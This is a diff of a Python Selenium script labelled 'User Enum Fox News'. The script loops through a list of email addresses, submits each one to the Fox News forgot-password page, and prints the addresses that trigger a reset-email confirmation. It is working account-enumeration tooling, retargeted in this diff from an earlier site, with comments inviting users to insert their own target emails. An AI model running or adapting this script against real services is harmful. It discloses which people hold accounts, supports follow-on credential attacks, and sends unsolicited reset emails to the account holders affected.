@@ -1,21 +1,29 @@
+# User Enum Fox News
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from time import sleep
 import extract_html_diff
 
+# Using edge browser
 driver = webdriver.Edge(executable_path='msedgedriver')
 
-print("The usernames present in wasPost are:")
+# Using Firefox browser
+#driver = webdriver.FirefoxProfile()
+#driver = webdriver.Firefox(driver)
 
-#for i in ["BegForMercy", "BraiasjdnkjnAxe", "CrazyMind", "DeathWaasdaish", "DisasterMaster", "ElNaaaino", "EndlessFacepalms", "FreakingOblin", "GhostlyPresence", "GridlockAndKey", "HoofHearted666", "KungFuMonk", "NineTees", "PlzJustDie", "SeekNDestroy", "SinisterChill", "BegqwForMercy", "BasxasdxrainAxe", "Crazy1Mind", "DeatasdasdhWish", "Dis1asterMaster", "EaslNino", "EndlessFaaacepalms", "FrrreakingOblin", "GhossdtlyPreseasnce", "GrisadlockAndKey", "HoofaHearted666", "KsungFuMonk", "NinessTees", "sPlzJustDie", "sSeeksNDestroy", "SssinisddterChill"]:
+print("The usernames present in Foxnews are:")
+
+# Place all the Email IDs to test in the for loop as shown below.
+# You can remove all the Email IDs below
 for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", "michael@gmail.com", "raghavdevgon@yahoo.com"]:
-    user = i
 
+    user = i
     driver.get("https://my.foxnews.com/?p=forgot-password")
     p1 = driver.page_source
     sleep(2)
-    elem=driver.find_element_by_xpath("//input[@type='email']")
-    #elem = driver.find_element_by_name("email")
+    # elem=driver.find_element_by_xpath("//input[@type='email']")
+    elem = driver.find_element_by_name("email")
+    sleep(1)
     elem.send_keys(user)
     elem.send_keys(Keys.RETURN)
     sleep(2)
@@ -25,4 +33,4 @@ for i in ["supeasdasdrman@gmail.com", "priyanka@gmail.com", "batman@gmail.com", 
     if "Reset email sent! Please check your inbox." in p3:
         print(i)
     sleep(2)
-
+driver.close()
